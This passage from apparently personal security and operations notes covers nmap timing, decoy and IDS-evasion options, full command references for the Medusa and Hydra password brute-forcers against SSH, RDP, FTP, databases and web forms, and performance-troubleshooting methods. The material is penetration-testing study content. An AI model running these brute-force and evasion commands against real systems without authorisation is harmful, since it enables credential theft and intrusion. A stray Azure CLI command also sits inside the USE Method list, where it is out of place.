<ul>
<li>UDP response -&gt; <strong>open</strong></li>
<li>ICMP type 3 code 3 -&gt; <strong>closed</strong></li>
<li>No response -&gt; <strong>open|filtered</strong></li>
</ul>
</li>
</ul>
<hr>
<h1 id="version-detection--sv"><a class="header" href="#version-detection--sv">Version Detection (-sV)</a></h1>
<p>Probes services to identify:</p>
<ul>
<li>Service name</li>
<li>Version</li>
<li>Extra metadata (workgroup, hostnames, OS hints)</li>
</ul>
<p>Example:<br>Identifies Samba <code>3.x‚Äì4.x</code> on port 445, workgroup WORKGROUP, OS Ubuntu.</p>
<p>nmap looks at the banners of the scanned services and prints them out and uses that to determine the version of the service. If it cannot identify the version through the banner, it will try to identify the service using a signature, but this is extremely noisy.</p>
<hr>
<h1 id="key-option-summary"><a class="header" href="#key-option-summary">Key Option Summary</a></h1>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-Pn</code></td><td>Skip host discovery.</td></tr>
<tr><td><code>-n</code></td><td>Disable DNS resolution.</td></tr>
<tr><td><code>--disable-arp-ping</code></td><td>Skip ARP ping.</td></tr>
<tr><td><code>--packet-trace</code></td><td>Show packets sent/received.</td></tr>
<tr><td><code>--reason</code></td><td>Explain port state classification.</td></tr>
<tr><td><code>-F</code></td><td>Fast scan (top 100).</td></tr>
</tbody>
</table>
</div>
<hr>
<h1 id="timing"><a class="header" href="#timing">Timing</a></h1>
<p>Because such settings cannot always be optimized manually, as in a black-box penetration test, Nmap offers six different timing templates (-T &lt;0-5&gt;) for us to use. These values (0-5) determine the aggressiveness of our scans. This can also have negative effects if the scan is too aggressive, and security systems may block us due to the produced network traffic. The default timing template used when we have defined nothing else is the normal (-T 3).</p>
<pre><code class="language-sh">-T 0 / -T paranoid
-T 1 / -T sneaky
-T 2 / -T polite
-T 3 / -T normal
-T 4 / -T aggressive
-T 5 / -T insane
</code></pre>
<p>These templates contain options that we can also set manually, and have seen some of them already. The developers determined the values set for these templates according to their best results, making it easier for us to adapt our scans to the corresponding network environment. The exact used options with their values we can find here: https://nmap.org/book/performance-timing-templates.html</p>
<h1 id="decoys--d"><a class="header" href="#decoys--d">Decoys (-D)</a></h1>
<ul>
<li>Use decoy IP addresses to obfuscate the true source of the scan.</li>
<li>Example: <code>nmap -D RND:10 &lt;target&gt;</code> uses 10 random decoys along with the real IP.</li>
<li>The decoys must be routable and online from the target‚Äôs perspective.</li>
<li>Helps evade simple logging and detection mechanisms.</li>
<li>Decoys can be used with SYN, ACK, ICMP, and OS Detection scans.</li>
</ul>
<h1 id="source-port-specification-source-port"><a class="header" href="#source-port-specification-source-port">Source Port Specification (‚Äìsource-port)</a></h1>
<ul>
<li>Specify a different source port for the scan.</li>
<li>Example: <code>nmap -sS -Pn -p- --source-port 53 &lt;target&gt;</code></li>
</ul>
<h1 id="firewallids-evasion"><a class="header" href="#firewallids-evasion">Firewall/IDS Evasion</a></h1>
<ul>
<li>nmap provides a number of ways to evade firewalls and IDS systems. Including:</li>
<li>Fragmentation of packets</li>
<li>Decoy IP addresses</li>
<li>Using different source ports</li>
<li>Randomizing the order of port scans</li>
<li>Timing options to slow down scans</li>
<li>Using different scan techniques (e.g., Xmas scan, NULL scan)</li>
</ul>
<h1 id="core-takeaways"><a class="header" href="#core-takeaways">Core Takeaways</a></h1>
<ul>
<li>Nmap uses 6 port states to categorize behavior.</li>
<li>SYN scans are fast &amp; stealthy; connect scans are accurate but noisy.</li>
<li>Filtered ports behave differently when dropped vs rejected.</li>
<li>UDP scanning is slow and ambiguous.</li>
<li>Version detection is essential for deeper enumeration.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="medusa"><a class="header" href="#medusa">Medusa</a></h1>
<p>Medusa is a fast, massively parallel, and modular login brute-forcer designed to support a wide array of services that allow remote authentication. Its primary objective is to enable penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.</p>
<p>Medusa‚Äôs key features include:</p>
<ul>
<li><strong>Speed and Parallelism</strong>: Utilizes multiple parallel connections to perform brute-force attacks efficiently</li>
<li><strong>Modularity</strong>: Supports numerous authentication protocols through dedicated modules</li>
<li><strong>Flexibility</strong>: Can target single hosts or multiple hosts from a file</li>
<li><strong>Ease of Use</strong>: Straightforward command-line interface with clear syntax</li>
</ul>
<hr>
<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
<p>Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
<pre><code class="language-sh">medusa -h
</code></pre>
<p>Installing Medusa on a Linux system is straightforward:</p>
<pre><code class="language-sh">sudo apt-get -y update
sudo apt-get -y install medusa
</code></pre>
<hr>
<h2 id="command-syntax-1"><a class="header" href="#command-syntax-1">Command Syntax</a></h2>
<p>Medusa‚Äôs command-line interface follows this general structure:</p>
<pre><code class="language-sh">medusa [target_options] [credential_options] -M module [module_options]
</code></pre>
<hr>
<h2 id="target-options"><a class="header" href="#target-options">Target Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-h HOST</code></td><td>Specify a single target hostname or IP address</td><td><code>medusa -h 192.168.1.10 ...</code></td></tr>
<tr><td><code>-H FILE</code></td><td>Specify a file containing a list of targets</td><td><code>medusa -H targets.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="credential-options"><a class="header" href="#credential-options">Credential Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-u USERNAME</code></td><td>Provide a single username</td><td><code>medusa -u admin ...</code></td></tr>
<tr><td><code>-U FILE</code></td><td>Provide a file containing a list of usernames</td><td><code>medusa -U usernames.txt ...</code></td></tr>
<tr><td><code>-p PASSWORD</code></td><td>Specify a single password</td><td><code>medusa -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Specify a file containing a list of passwords</td><td><code>medusa -P passwords.txt ...</code></td></tr>
<tr><td><code>-e ns</code></td><td>Check for empty passwords (n) and passwords matching username (s)</td><td><code>medusa -e ns ...</code></td></tr>
</tbody>
</table>
</div>
<p>The <code>-e</code> option is useful for testing weak configurations:</p>
<ul>
<li><code>-e n</code>: Try empty passwords</li>
<li><code>-e s</code>: Try passwords matching the username</li>
<li><code>-e ns</code>: Try both empty and same-as-username passwords</li>
</ul>
<hr>
<h2 id="attack-options-1"><a class="header" href="#attack-options-1">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-M MODULE</code></td><td>Define the specific module to use for the attack</td><td><code>medusa -M ssh ...</code></td></tr>
<tr><td><code>-m "OPTION"</code></td><td>Provide additional parameters required by the chosen module</td><td><code>medusa -M http -m "POST /login.php..."</code></td></tr>
<tr><td><code>-t TASKS</code></td><td>Define the number of parallel login attempts to run</td><td><code>medusa -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop the attack after the first successful login on current host</td><td><code>medusa -f ...</code></td></tr>
<tr><td><code>-F</code></td><td>Fast mode: Stop the attack after the first successful login on any host</td><td><code>medusa -F ...</code></td></tr>
<tr><td><code>-n PORT</code></td><td>Specify a non-default port for the target service</td><td><code>medusa -n 2222 ...</code></td></tr>
<tr><td><code>-v LEVEL</code></td><td>Verbose output: Display detailed information (0-6, higher = more verbose)</td><td><code>medusa -v 4 ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="modules-1"><a class="header" href="#modules-1">Modules</a></h2>
<p>Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Service/Protocol</th><th>Description</th><th>Example Command</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol</td><td>Brute-forcing FTP login credentials, used for file transfers over a network</td><td><code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>http</code></td><td>Hypertext Transfer Protocol</td><td>Brute-forcing login forms on web applications over HTTP (GET/POST)</td><td><code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Brute-forcing IMAP logins, often used to access email servers</td><td><code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL Database</td><td>Brute-forcing MySQL database credentials, commonly used for web applications and databases</td><td><code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol 3</td><td>Brute-forcing POP3 logins, typically used to retrieve emails from a mail server</td><td><code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems</td><td><code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Brute-forcing SSH logins, commonly used for secure remote access</td><td><code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>svn</code></td><td>Subversion (SVN)</td><td>Brute-forcing Subversion (SVN) repositories for version control</td><td><code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet Protocol</td><td>Brute-forcing Telnet services for remote command execution on older systems</td><td><code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>vnc</code></td><td>Virtual Network Computing</td><td>Brute-forcing VNC login credentials for remote desktop access</td><td><code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr>
<tr><td><code>web-form</code></td><td>Web Login Forms</td><td>Brute-forcing login forms on websites using HTTP POST requests</td><td><code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&amp;password=^PASS^:F=Invalid"</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-usage-examples"><a class="header" href="#common-usage-examples">Common Usage Examples</a></h2>
<h3 id="ssh-brute-force-attack-1"><a class="header" href="#ssh-brute-force-attack-1">SSH Brute-Force Attack</a></h3>
<p>Target a single SSH server with username and password lists:</p>
<pre><code class="language-sh">medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<p>This command instructs Medusa to:</p>
<ul>
<li>Target the host at 192.168.0.100</li>
<li>Use the usernames from the usernames.txt file</li>
<li>Test the passwords listed in the passwords.txt file</li>
<li>Employ the ssh module for the attack</li>
</ul>
<h3 id="multiple-web-servers-with-basic-http-authentication-1"><a class="header" href="#multiple-web-servers-with-basic-http-authentication-1">Multiple Web Servers with Basic HTTP Authentication</a></h3>
<p>Test multiple web servers concurrently:</p>
<pre><code class="language-sh">medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
</code></pre>
<p>In this case, Medusa will:</p>
<ul>
<li>Iterate through the list of web servers in web_servers.txt</li>
<li>Use the usernames and passwords provided</li>
<li>Employ the http module with the GET method to attempt logins</li>
<li>Run multiple threads efficiently checking each server for weak credentials</li>
</ul>
<h3 id="testing-for-empty-or-default-passwords"><a class="header" href="#testing-for-empty-or-default-passwords">Testing for Empty or Default Passwords</a></h3>
<p>Assess whether any accounts have empty or default passwords:</p>
<pre><code class="language-sh">medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
</code></pre>
<p>This command instructs Medusa to:</p>
<ul>
<li>Target the host at 10.0.0.5</li>
<li>Use the usernames from usernames.txt</li>
<li>Perform additional checks for empty passwords (<code>-e n</code>) and passwords matching the username (<code>-e s</code>)</li>
<li>Use the appropriate service module</li>
</ul>
<p>Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.</p>
<h3 id="http-post-form-attack-2"><a class="header" href="#http-post-form-attack-2">HTTP POST Form Attack</a></h3>
<p>Attack a web login form using POST requests:</p>
<pre><code class="language-sh">medusa -M http -h www.example.com -U users.txt -P passwords.txt -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&amp;password=^PASS^"
</code></pre>
<h3 id="custom-port-ssh-attack-1"><a class="header" href="#custom-port-ssh-attack-1">Custom Port SSH Attack</a></h3>
<p>Target SSH on a non-standard port:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -n 2222 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="fast-mode-stop-on-first-success-1"><a class="header" href="#fast-mode-stop-on-first-success-1">Fast Mode (Stop on First Success)</a></h3>
<p>Stop immediately after finding valid credentials:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -f
</code></pre>
<p>Use <code>-F</code> to stop after first success on any host when targeting multiple hosts.</p>
<h3 id="verbose-output-2"><a class="header" href="#verbose-output-2">Verbose Output</a></h3>
<p>Get detailed information about the attack progress:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -v 4
</code></pre>
<p>Higher verbosity levels (up to 6) provide more detailed output.</p>
<h3 id="parallel-tasks-1"><a class="header" href="#parallel-tasks-1">Parallel Tasks</a></h3>
<p>Control the number of parallel login attempts:</p>
<pre><code class="language-sh">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -t 8
</code></pre>
<p>Increasing the number of tasks can speed up the attack but may also increase the risk of detection or overwhelming the target service.</p>
<hr>
<h2 id="core-takeaways-1"><a class="header" href="#core-takeaways-1">Core Takeaways</a></h2>
<ul>
<li>Medusa uses parallel connections to efficiently brute-force login credentials across multiple protocols</li>
<li>Target options (<code>-h</code> or <code>-H</code>) specify hosts, while credential options (<code>-u</code>/<code>-U</code> and <code>-p</code>/<code>-P</code>) specify usernames and passwords</li>
<li>The <code>-e</code> option allows testing for weak configurations like empty passwords or passwords matching usernames</li>
<li>Module selection (<code>-M</code>) determines which authentication protocol to target</li>
<li>Use <code>-f</code> or <code>-F</code> to stop after the first successful login, saving time when valid credentials are found</li>
<li>Adjust <code>-t</code> to control parallel threads, balancing speed against detection risk</li>
<li>Module options (<code>-m</code>) may be required for complex scenarios like HTTP form attacks</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hydra"><a class="header" href="#hydra">Hydra</a></h1>
<p>Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.</p>
<p>Hydra‚Äôs popularity stems from its:</p>
<ul>
<li><strong>Speed and Efficiency</strong>: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.</li>
<li><strong>Flexibility</strong>: Hydra supports many protocols and services, making it adaptable to various attack scenarios.</li>
<li><strong>Ease of Use</strong>: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.</li>
</ul>
<hr>
<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
<p>Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
<pre><code class="language-sh">hydra -h
</code></pre>
<p>If Hydra is not installed or you are using a different Linux distribution, you can install it from the package repository:</p>
<pre><code class="language-sh">sudo apt-get -y update
sudo apt-get -y install hydra
</code></pre>
<hr>
<h2 id="basic-syntax-1"><a class="header" href="#basic-syntax-1">Basic Syntax</a></h2>
<p>Hydra‚Äôs basic syntax is:</p>
<pre><code class="language-sh">hydra [login_options] [password_options] [attack_options] [service_options] service://server
</code></pre>
<hr>
<h2 id="login-options-1"><a class="header" href="#login-options-1">Login Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-l LOGIN</code></td><td>Specify a single username</td><td><code>hydra -l admin ...</code></td></tr>
<tr><td><code>-L FILE</code></td><td>Specify a file containing a list of usernames</td><td><code>hydra -L usernames.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="password-options-1"><a class="header" href="#password-options-1">Password Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-p PASS</code></td><td>Provide a single password</td><td><code>hydra -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Provide a file containing a list of passwords</td><td><code>hydra -P passwords.txt ...</code></td></tr>
<tr><td><code>-x MIN:MAX:CHARSET</code></td><td>Generate passwords dynamically</td><td><code>hydra -x 6:8:aA1 ...</code></td></tr>
</tbody>
</table>
</div>
<p>The <code>-x</code> option generates passwords on-the-fly:</p>
<ul>
<li><code>MIN:MAX</code> specifies the password length range</li>
<li><code>CHARSET</code> defines the character set to use (e.g., <code>a</code> for lowercase, <code>A</code> for uppercase, <code>1</code> for numbers)</li>
</ul>
<hr>
<h2 id="attack-options-2"><a class="header" href="#attack-options-2">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-t TASKS</code></td><td>Define the number of parallel tasks (threads) to run, potentially speeding up the attack</td><td><code>hydra -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop the attack after the first successful login is found</td><td><code>hydra -f ...</code></td></tr>
<tr><td><code>-s PORT</code></td><td>Specify a non-default port for the target service</td><td><code>hydra -s 2222 ...</code></td></tr>
<tr><td><code>-v</code></td><td>Verbose output: Display detailed information about the attack‚Äôs progress</td><td><code>hydra -v ...</code></td></tr>
<tr><td><code>-V</code></td><td>Very verbose output: Display even more detailed information</td><td><code>hydra -V ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="hydra-services"><a class="header" href="#hydra-services">Hydra Services</a></h2>
<p>Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol‚Äôs communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses.</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Service</th><th>Protocol</th><th>Description</th><th>Example Command</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol (FTP)</td><td>Used to brute-force login credentials for FTP services, commonly used to transfer files over a network</td><td><code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Targets SSH services to brute-force credentials, commonly used for secure remote login to systems</td><td><code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code></td></tr>
<tr><td><code>http-get</code></td><td>HTTP GET</td><td>Used to brute-force login credentials for HTTP web login forms using GET requests</td><td><code>hydra -l admin -P /path/to/password_list.txt http-get://example.com/login</code></td></tr>
<tr><td><code>http-post</code></td><td>HTTP POST</td><td>Used to brute-force login credentials for HTTP web login forms using POST requests</td><td><code>hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect"</code></td></tr>
<tr><td><code>smtp</code></td><td>Simple Mail Transfer Protocol</td><td>Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails</td><td><code>hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol (POP3)</td><td>Targets email retrieval services to brute-force credentials for POP3 login</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Used to brute-force credentials for IMAP services, which allow users to access their email remotely</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Targets RDP services to brute-force credentials for remote desktop connections</td><td><code>hydra -l administrator -P /path/to/password_list.txt rdp://192.168.1.100</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet</td><td>Targets Telnet services for remote terminal access</td><td><code>hydra -l admin -P /path/to/password_list.txt telnet://192.168.1.100</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL</td><td>Targets MySQL database servers</td><td><code>hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100</code></td></tr>
<tr><td><code>postgres</code></td><td>PostgreSQL</td><td>Targets PostgreSQL database servers</td><td><code>hydra -l postgres -P /path/to/password_list.txt postgres://192.168.1.100</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="http-form-based-authentication"><a class="header" href="#http-form-based-authentication">HTTP Form-Based Authentication</a></h2>
<p>For HTTP form-based authentication, Hydra uses a specific syntax:</p>
<pre><code>http-post-form "/path/to/login.php:field1=^USER^&amp;field2=^PASS^:failure_string"
</code></pre>
<ul>
<li><code>^USER^</code> and <code>^PASS^</code> are placeholders that Hydra replaces with actual credentials</li>
<li>The failure string (after the second <code>:</code>) helps Hydra identify failed login attempts</li>
<li>Use <code>F=</code> prefix for failure strings (e.g., <code>F=incorrect</code>)</li>
</ul>
<p>Example:</p>
<pre><code class="language-sh">hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<hr>
<h2 id="password-generation--x"><a class="header" href="#password-generation--x">Password Generation (-x)</a></h2>
<p>The <code>-x</code> option allows Hydra to generate passwords dynamically instead of using a wordlist. This is useful when you have information about password requirements.</p>
<p>Format: <code>-x MIN:MAX:CHARSET</code></p>
<ul>
<li><code>MIN</code>: Minimum password length</li>
<li><code>MAX</code>: Maximum password length</li>
<li><code>CHARSET</code>: Character set to use
<ul>
<li><code>a</code> = lowercase letters</li>
<li><code>A</code> = uppercase letters</li>
<li><code>1</code> = numbers</li>
<li>Custom character sets can be specified directly</li>
</ul>
</li>
</ul>
<p>Example: If you know the password is 6-8 characters with lowercase, uppercase, and numbers:</p>
<pre><code class="language-sh">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://192.168.1.100
</code></pre>
<p>This command instructs Hydra to:</p>
<ul>
<li>Use the username ‚Äúadministrator‚Äù</li>
<li>Generate and test passwords ranging from 6 to 8 characters</li>
<li>Use the specified character set (lowercase, uppercase, numbers)</li>
<li>Target the RDP service on 192.168.1.100</li>
</ul>
<p>Hydra will generate and test all possible password combinations within the specified parameters.</p>
<hr>
<h2 id="common-usage-examples-1"><a class="header" href="#common-usage-examples-1">Common Usage Examples</a></h2>
<h3 id="ssh-brute-force-1"><a class="header" href="#ssh-brute-force-1">SSH Brute Force</a></h3>
<pre><code class="language-sh">hydra -l root -P /path/to/passwords.txt -t 4 ssh://192.168.1.100
</code></pre>
<h3 id="ftp-brute-force-with-username-list"><a class="header" href="#ftp-brute-force-with-username-list">FTP Brute Force with Username List</a></h3>
<pre><code class="language-sh">hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100
</code></pre>
<h3 id="http-post-form-attack-3"><a class="header" href="#http-post-form-attack-3">HTTP POST Form Attack</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<h3 id="rdp-with-password-generation-1"><a class="header" href="#rdp-with-password-generation-1">RDP with Password Generation</a></h3>
<pre><code class="language-sh">hydra -l administrator -x 6:8:aA1 rdp://192.168.1.100
</code></pre>
<h3 id="ssh-on-non-default-port-1"><a class="header" href="#ssh-on-non-default-port-1">SSH on Non-Default Port</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
</code></pre>
<h3 id="stop-after-first-success-1"><a class="header" href="#stop-after-first-success-1">Stop After First Success</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -f ssh://192.168.1.100
</code></pre>
<h3 id="verbose-output-for-debugging"><a class="header" href="#verbose-output-for-debugging">Verbose Output for Debugging</a></h3>
<pre><code class="language-sh">hydra -l admin -P passwords.txt -v ssh://192.168.1.100
</code></pre>
<hr>
<h2 id="core-takeaways-2"><a class="header" href="#core-takeaways-2">Core Takeaways</a></h2>
<ul>
<li>Hydra uses parallel connections to speed up brute-force attacks significantly.</li>
<li>Login options (<code>-l</code> or <code>-L</code>) specify usernames, while password options (<code>-p</code>, <code>-P</code>, or <code>-x</code>) specify passwords.</li>
<li>The <code>-x</code> option allows dynamic password generation based on length and character set requirements.</li>
<li>HTTP form attacks require specific syntax with <code>^USER^</code> and <code>^PASS^</code> placeholders.</li>
<li>Use <code>-f</code> to stop after the first successful login, and <code>-v</code>/<code>-V</code> for detailed output.</li>
<li>Adjust <code>-t</code> to control parallel threads, balancing speed against detection risk.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h1>
<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
<ul>
<li><a href="troubleshooting/linux">linux</a></li>
<li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="performance-mantras"><a class="header" href="#performance-mantras">Performance Mantras</a></h1>
<p>This is a tuning methodology that shows how best to improve performance, listing actionable items in order from most to least effective.</p>
<ol>
<li>Don‚Äôt do it. (Eliminate unnecessary work)</li>
<li>Do it, but don‚Äôt do it again. (caching)</li>
<li>Do it less. (tune refreshes, polling, or updates to be less frequent)</li>
<li>Do it later. (Write-back caching)</li>
<li>Do it when they‚Äôre not looking. (schedule work to run off-peak hours)</li>
<li>Do it concurrently. (switch from single to multi-threaded)</li>
<li>Do it more cheaply. (buy faster hardware)</li>
</ol>
<p><em>Credits to Scott Emmons @ Netflix</em></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-problem-statement"><a class="header" href="#the-problem-statement">The Problem Statement</a></h1>
<p>Defining the problem statement is a routine task completed as a first step when starting a investigation.</p>
<p>It is characterised as:</p>
<ol>
<li>What makes you think there is a performance problem?</li>
<li>Has this system ever performed well?</li>
<li>What changed recently? Software? Hardware? Load?</li>
<li>Can the problem be expressed in terms of latency or runtime?</li>
<li>Does the problem affect everyone or a subset of users?</li>
<li>What is the environment? What software and hardware are used? Versions? Configuration?</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="red-method"><a class="header" href="#red-method">RED Method</a></h1>
<p>The focus of the RED method is services. Typically, cloud services in a microservices architecture.</p>
<p>It can be summarized as:
For every service, check the request rate, errors, and duration per request</p>
<p>The metrics to check are:</p>
<ol>
<li>Request rate: The number of requests per second</li>
<li>Errors: The number of requests that failed</li>
<li>Duration: The time for requests to completes</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="use-method"><a class="header" href="#use-method">USE Method</a></h1>
<p>The utilization, saturation, and errors method should be used early in a performance investigation to identify systemic bottlenecks. It can be summarized as:</p>
<ol>
<li>For every resource, check utilization, saturation, and errors.</li>
</ol>
<p>Steps</p>
<ol>
<li>The first step is to list resources involved (CPUs, RAM, NICs, storage devices, accelerators (GPUs, TPUs, etc.), controllers (storage, network), interconnects)</li>
<li>Once you have a list of resources, consider the metric types available for each
az aks nodepool update ‚Äìresource-group rc-02us1-kubernetes-01-rg ‚Äìcluster-name rc-02us1-kubernetes-01-cluster  ‚Äìname nplinux02 ‚Äìlabels k8s.aprimo.com/workloadType=scoring ‚Äìno-wait</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
<ul>
<li><a href="#troubleshooting-memory">memory</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-memory"><a class="header" href="#troubleshooting-memory">Troubleshooting Memory</a></h1>
<h3 id="file-system-paging"><a class="header" href="#file-system-paging">File System Paging</a></h3>
<p>File system paging is caused by the reading and writing of of pages in memory-mapped files. When needed, the kernel can free memory by paging some out. If a file system page has been modified in main memory (called dirty), the page out will require it to be written to disk. If, instead, the file system page has not been modified (called clean), the page out simply frees the memory for immediate reuse, since a copy already exists on disk.</p>
<h3 id="anonymous-paging-swapping"><a class="header" href="#anonymous-paging-swapping">Anonymous Paging (swapping)</a></h3>
<p>Anonymous paging involves data that is private to a process; the process heap and stack. It is termed anonymous because it has no named location in the operating system. Anonymous page-outs require moving data to the physical swap locations or swap files. Linux uses the term swapping for this type of paging. Anonymous paging hurts performance and has therefore been referred to as ‚Äòbad paging‚Äô. When applications access memory pages that have been paged out, they block on the disk I/O required to read them back to main memory. This is called ‚Äòanonymous page-in‚Äô, which introduces latency to applications.</p>
<h3 id="how-the-operating-system-deals-with-memory-saturation"><a class="header" href="#how-the-operating-system-deals-with-memory-saturation">How the operating system deals with memory saturation:</a></h3>
<ul>
<li>Paging</li>
<li>Reaping</li>
<li>OOM killer</li>
</ul>
<h3 id="working-set-size"><a class="header" href="#working-set-size">Working Set Size</a></h3>
<ul>
<li>Working Set Size (WSS) is the amount of main memory a process frequently uses to perform work. It is a useful concept for memory perforamnce tuning. Performance should greatly improve if the WSS can fit in the CPU caches, rather than main memory. Also, performance will degrade if the WSS exceeds the amount of main memory, as this additional overhead will involve swapping.</li>
</ul>
